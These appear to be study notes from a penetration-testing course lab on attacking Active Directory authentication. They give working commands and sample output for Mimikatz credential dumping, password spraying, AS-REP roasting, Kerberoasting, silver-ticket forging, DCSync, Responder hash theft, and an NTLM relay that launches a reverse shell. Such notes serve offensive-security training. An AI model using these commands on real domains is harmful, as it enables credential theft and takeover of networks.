## Cached AD Credentials (Logged users and tickets - From Windows)

We can enter **privilege::debug** to engage the _SeDebugPrivlege_ privilege, which will allow us to interact with a process owned by another account

```shell
PS C:\Windows\system32> cd C:\Tools

PS C:\Tools\> .\mimikatz.exe
...

mimikatz # privilege::debug
Privilege '20' OK
```

We can run **sekurlsa::logonpasswords** to dump the credentials of all logged-on users with the _Sekurlsa_ module.

```shell
mimikatz # sekurlsa::logonpasswords

```

The output above shows all credential information stored in LSASS for the domain users _jeff_ and _dave_, including cached hashes. We can observe two types of hashes highlighted in the output. This will vary based on the functional level of the AD implementation. For AD instances at a functional level of Windows 2003, NTLM is the only available hashing algorithm. For instances running Windows Server 2008 or later, both NTLM and SHA-1 (a common companion for AES encryption) may be available. On older operating systems like Windows 7, or operating systems that have it manually set, WDigest[11](https://portal.offsec.com/courses/pen-200/books-and-videos/modal/modules/attacking-active-directory-authentication/understanding-active-directory-authentication/cached-ad-credentials#fn11) will be enabled. When WDigest is enabled, running Mimikatz will reveal cleartext passwords alongside the password hashes.

A different approach and use of Mimikatz is to exploit Kerberos authentication by abusing TGT and service tickets. As already discussed, we know that Kerberos TGT and service tickets for users currently logged on to the local machine are stored for future use. These tickets are also stored in LSASS, and we can use Mimikatz to interact with and retrieve our own tickets as well as the tickets of other local users. Let's open a second PowerShell window and list the contents of the SMB share on WEB04 with UNC path **\\web04.corp.com\backup**. This will create and cache a service ticket.

```shell
PS C:\Users\jeff> dir \\web04.corp.com\backup


    Directory: \\web04.corp.com\backup


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         9/13/2022   2:52 AM              0 backup_schemata.txt
```

Once we've executed the directory listing on the SMB share, we can use Mimikatz to show the tickets that are stored in memory by entering **sekurlsa::tickets**.

```shell
mimikatz # sekurlsa::tickets

```

The output shows both a TGT and a TGS. Stealing a TGS would allow us to access only particular resources associated with those tickets. Alternatively, armed with a TGT, we could request a TGS for specific resources we want to target within the domain


## Password Spraying (Reused passwords - From Windows or Crackmapexec)

> If you receive a network error, make sure that the encoding of **usernames.txt** is _ANSI_. You can use Notepad's _Save As_ functionality to change the encoding.

To review account policy as registered user we can use command `net accounts`. Here we can _Lockout threshold_ and _Lockout observation window_.

For crackmapexec and kerbrute, we had to provide a list of usernames. To obtain a list of all domain users, we can leverage techniques we learned in the Module _Active Directory Introduction and Enumeration_ or use the built-in user enumeration functions of both tools.
#### Password Spraying by PS Script

For password spraying tactic we can use the PowerShell script **[Spray-Passwords.ps1](https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/modules/Spray-Passwords.ps1)**

```shell
PS C:\Tools> .\Spray-Passwords.ps1 -Pass Nexus123! -Admin
WARNING: also targeting admin accounts.
Performing brute force - press [q] to stop the process and print results...
Guessed password for user: 'pete' = 'Nexus123!'
Guessed password for user: 'jen' = 'Nexus123!'
Users guessed are:
 'pete' with password: 'Nexus123!'
 'jen' with password: 'Nexus123!'
```

#### Password Spraying by SMB and Crackmapexec

We have to specify the wordlist for users. As a bonus, however, the output of crackmapexec not only displays if credentials are valid, but also if the user with the identified credentials has administrative privileges on the target system.

```bash
kali@kali:~$ cat users.txt
dave
jen
pete

kali@kali:~$ crackmapexec smb 192.168.50.75 -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success

SMB         192.168.50.75   445    CLIENT75         [+] corp.com\pete:Nexus123!
```

#### Password Spraying by Kerbrute (TGT)

We can also use the tool _kerbrute_, implementing this technique to spray passwords. Since this tool is cross-platform, we can use it on Windows and Linux.

```shell
PS C:\Tools> type .\usernames.txt
pete
dave
jen

PS C:\Tools> .\kerbrute_windows_amd64.exe passwordspray -d corp.com .\usernames.txt "Nexus123!"

## AS-REP Roasting (Disabled Kerberos preauthentication users - From Windows or impacket-GetNPUsers)

https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/asreproast

By default, the AD user account option _Do not require Kerberos preauthentication_ is disabled, meaning that Kerberos preauthentication is performed for all users. However, it is possible to enable this account option manually. In assessments, we may find accounts with this option enabled as some applications and technologies require it to function properly.

```bash
kali@kali:~$ impacket-GetNPUsers -dc-ip 192.168.50.70  -request -outputfile hashes.asreproast corp.com/pete
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

```

The output shows that _dave_ has the user account option _Do not require Kerberos preauthentication_ enabled, meaning it's vulnerable to AS-REP Roasting. Then we cracked his password.

We can also perform AS-REP Roasting on Windows. We'll use _Rubeus_, which is a toolset for raw Kerberos interactions and abuses. To perform this attack, we'll connect to CLIENT75 via RDP as domain user _jeff_ with the password _HenchmanPutridBonbon11_. Since we're performing this attack as a pre-authenticated domain user, we don't have to provide any other options to Rubeus except **asreproast**. Rubeus will automatically identify vulnerable user accounts. We also add the flag **/nowrap** to prevent new lines being added to the resulting AS-REP hashes.

```shell
PS C:\Users\jeff> cd C:\Tools

PS C:\Tools> .\Rubeus.exe asreproast /nowrap

```

To identify users with the enabled AD user account option _Do not require Kerberos preauthentication_, we can use PowerView's _Get-DomainUser_ function with the option **-PreauthNotRequired** on Windows.

Let's assume that we are conducting an assessment in which we cannot identify any AD users with the account option _Do not require Kerberos preauthentication_ enabled. While enumerating, we notice that we have _GenericWrite_ or _GenericAll_ permissions[5](https://portal.offsec.com/courses/pen-200/books-and-videos/modal/modules/attacking-active-directory-authentication/performing-attacks-on-active-directory-authentication/as-rep-roasting#fn5) on another AD user account. Using these permissions, we could reset their passwords, but this would lock out the user from accessing the account. We could also leverage these permissions to modify the User Account Control value of the user to not require Kerberos preauthentication.[6](https://portal.offsec.com/courses/pen-200/books-and-videos/modal/modules/attacking-active-directory-authentication/performing-attacks-on-active-directory-authentication/as-rep-roasting#fn6) This attack is known as _Targeted AS-REP Roasting_. Notably, we should reset the User Account Control value of the user once we've obtained the hash.

## Kerberoasting (Stealing tickets and retrieve hashes - From Windows or impacket-GetUserSPNs)

https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/kerberoast

To perform Kerberoasting, we'll use Rubeus again. We specify the **kerberoast** command to launch this attack technique. In addition, we'll provide **hashes.kerberoast** as an argument for **/outfile** to store the resulting TGS-REP hash in. Since we'll execute Rubeus as an authenticated domain user, the tool will identify all SPNs linked with a domain user.

```shell
PS C:\Tools> .\Rubeus.exe kerberoast /outfile:hashes.kerberoast

   ______        _

  v2.1.2


[*] Action: Kerberoasting

[*] NOTICE: AES hashes will be returned for AES-enabled accounts.

```

The output shows that Rubeus identified one user account vulnerable to Kerberoasting and wrote the hash to an output file. Now, let's copy **hashes.kerberoast** to our Kali machine. We can then review the Hashcat help for the correct mode to crack a TGS-REP hash.

```bash
kali@kali:~$ cat hashes.kerberoast
$krb5tgs$23$*iis_service$corp.com$HTTP/web04.corp.com:80@corp.com*$940AD9DCF5DD5CD8E91A86D4BA0396DB$F57066A4F4F8FF5D70DF39B0C98ED7948A5DB08D689B92446E600B49FD502DEA39A8ED3B0B766E5CD40410464263557BC0E4025BFB92D89BA5C12C26C72232905DEC4D060D3C8988945419AB4A7E7ADEC407D22BF6871D...

```

Next, let's perform Kerberoasting from Linux. We can use _impacket-GetUserSPNs_[2](https://portal.offsec.com/courses/pen-200/books-and-videos/modal/modules/attacking-active-directory-authentication/performing-attacks-on-active-directory-authentication/kerberoasting#fn2) with the IP of the domain controller as the argument for **-dc-ip**. Since our Kali machine is not joined to the domain, we also have to provide domain user credentials to obtain the TGS-REP hash. As before, we can use **-request** to obtain the TGS and output them in a compatible format for Hashcat.

```bash
kali@kali:~$ sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete

```
## Silver Tickets (Crafting a valid ticket for a specific service - From Windows)

https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/silver-ticket

In general, we need to collect the following three pieces of information to create a silver ticket:
- SPN password hash
- Domain SID
- Target SPN

Now, we do not have permissions

```shell
PS C:\Users\jeff> iwr -UseDefaultCredentials http://web04
iwr :
401 - Unauthorized: Access is denied due to invalid credentials.
Server Error
...
```

Since we are a local Administrator on this machine where _iis_service_ has an established session, we can use Mimikatz to retrieve the SPN password hash (NTLM hash of _iis_service_), which is the first piece of information we need to create a silver ticket. Let's start PowerShell as Administrator and launch Mimikatz. As we already learned, we can use **privilege::debug** and **sekurlsa::logonpasswords** to extract cached AD credentials.

```shell
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::logonpasswords

Authentication Id : 0 ; 1147751 (00000000:00118367)
Session           : Service from 0
User Name         : iis_service
Domain            : CORP
Logon Server      : DC1
Logon Time        : 9/14/2022 4:52:14 AM
SID               : S-1-5-21-1987370270-658905905-1781884369-1109
        msv :
         [00000003] Primary
         * Username : iis_service
         * Domain   : CORP
         * NTLM     : 4d28cf5252d39971419580a51484ca09
         * SHA1     : ad321732afe417ebbd24d5c098f986c07872f312
         * DPAPI    : 1210259a27882fac52cf7c679ecf4443
...
```

Now, let's obtain the domain SID, the second piece of information we need. We can enter **whoami /user** to get the SID of the current user. Alternatively, we could also retrieve the SID of the SPN user account from the output of Mimikatz, since the domain user accounts exist in the same domain. As covered in the _Windows Privilege Escalation_ Module, the SID consists of several parts. Since we're only interested in the Domain SID, we'll omit the RID of the user.

```
PS C:\Users\jeff> whoami /user

USER INFORMATION
----------------

User Name SID
========= =============================================
corp\jeff S-1-5-21-1987370270-658905905-1781884369-1105
```

The domain SID would be **S-1-5-21-1987370270-658905905-1781884369**, not including the last part.

The last list item is the target SPN. For this example, we'll target the HTTP SPN resource on WEB04 (_HTTP/web04.corp.com:80_) because we want to access the web page running on IIS.

Now that we have collected all three pieces of information, we can build the command to create a silver ticket with Mimikatz. We can create the forged service ticket with the _kerberos::golden_ module. This module provides the capabilities for creating golden and silver tickets alike. We'll explore the concept of golden tickets in the Module _Lateral Movement in Active Directory_.

We need to provide the domain SID (**/sid:**), domain name (**/domain:**), and the target where the SPN runs (**/target:**). We also need to include the SPN protocol (**/service:**), NTLM hash of the SPN (**/rc4:**), and the **/ptt** option, which allows us to inject the forged ticket into the memory of the machine we execute the command on. Finally, we must enter an existing domain user for **/user:**. This user will be set in the forged ticket. For this example, we'll use _jeffadmin_. However, we could also use any other domain user since we can set the permissions and groups ourselves.

The complete command can be found in the following listing:

```
mimikatz # kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Golden ticket for 'jeffadmin @ corp.com' successfully submitted for current session

mimikatz # exit
Bye!
```

A new service ticket for the SPN _HTTP/web04.corp.com_ has been loaded into memory and Mimikatz set appropriate group membership permissions in the forged ticket. From the perspective of the IIS application, the current user will be both the built-in local administrator ( _Relative Id: 500_ ) and a member of several highly-privileged groups, including the Domain Admins group ( _Relative Id: 512_ ) as highlighted above.

This means we should have the ticket ready to use in memory. We can confirm this with **klist**. 

```
PS C:\Tools> klist

Current LogonId is 0:0xa04cc

Cached Tickets: (1)

#0>     Client: jeffadmin @ corp.com
        Server: http/web04.corp.com @ corp.com

        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0
        Kdc Called:
```

The output shows that we have the silver ticket for _jeffadmin_ to access _http/web04.corp.com_ submitted to our current session. This should allow us to access the web page on WEB04 as _jeffadmin_. Let's verify our access using the same command as before.

```

## DSync (User with a set of permissions impersonate the DC and retrieve passwords - From Windows or impacket-secretsdump)

https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/dcsync

To launch such a replication, a user needs to have the _Replicating Directory Changes_, _Replicating Directory Changes All_, and _Replicating Directory Changes in Filtered Set_ rights. By default, members of the _Domain Admins_, _Enterprise Admins_, and _Administrators_ groups have these rights assigned. If we obtain access to a user account in one of these groups or with these rights assigned, we can perform a _dcsync_ attack in which we impersonate a domain controller. This allows us to request any user credentials from the domain. We can perform the dcsync attack to obtain any user password hash in the domain, even the domain administrator _Administrator_.

```shell
PS C:\Tools> .\mimikatz.exe
...

mimikatz # lsadump::dcsync /user:corp\dave
[DC] 'corp.com' will be the domain
[DC] 'DC1.corp.com' will be the DC server

```

For now, let's perform the dcsync attack from Linux as well. We'll use impacket-secretsdump to acheive this. To launch it, we'll enter the target username **dave** as an argument for **-just-dc-user** and provide the credentials of a user with the required rights, as well as the IP of the domain controller in the format **domain/user:password@ip**.

```bash

## Stealing NTLM hashes with Responder

We can perform this in some situations:
* If we have a shell but no credentials, we can setup responder and steal NTLM hash
* If we are connected to the same network:
	When a user or a system tries to perform a Name Resolution (NR), a series of procedures are conducted by a machine to retrieve a host's IP address by its hostname. On Windows machines, the procedure will roughly be as follows:
			- The hostname file share's IP address is required.
			- The local host file (C:\\Windows\\System32\\Drivers\\etc\\hosts) will be checked for suitable records.
			- If no records are found, the machine switches to the local DNS cache, which keeps track of recently resolved names.
			- Is there no local DNS record? A query will be sent to the DNS server that has been configured.
			- If all else fails, the machine will issue a multicast query, requesting the IP address of the file share from other machines on the network.
	Suppose a user mistyped a shared folder's name `\\mysharefoder\` instead of `\\mysharedfolder\`. In that case, all name resolutions will fail because the name does not exist, and the machine will send a multicast query to all devices on the network, including us running our fake SMB server. This is a problem because no measures are taken to verify the integrity of the responses. Attackers can take advantage of this mechanism by listening in on such queries and spoofing responses, leading the victim to believe malicious servers are trustworthy. This trust is usually used to steal credentials.
* Making a website to point to our malicious server and stealing its NTLM hash

```bash
C:\Windows\system32>dir \\192.168.119.2\share\test

## NTLM Relay Attack (stealing NTLMv2 hash from server 1 and launch command in server 2)

First, setup a responder listener and check if we receive some hashes (previous section). If we cannot crack these hashes, we can perform a NTLM Relay attack. 

We setup `ntlmrelayx` pointing to the server where we can authenticate using the stole NTLMv2 hash.
```bash
(WE ESTABLISH A NTLM RELAY POINTING TO SERVER 2)

kali@kali:~$ impacket-ntlmrelayx --no-http-server -smb2support -t <IP SERVER 2> -c "<PS encoded reverse shell to our Kali in port 8080>"
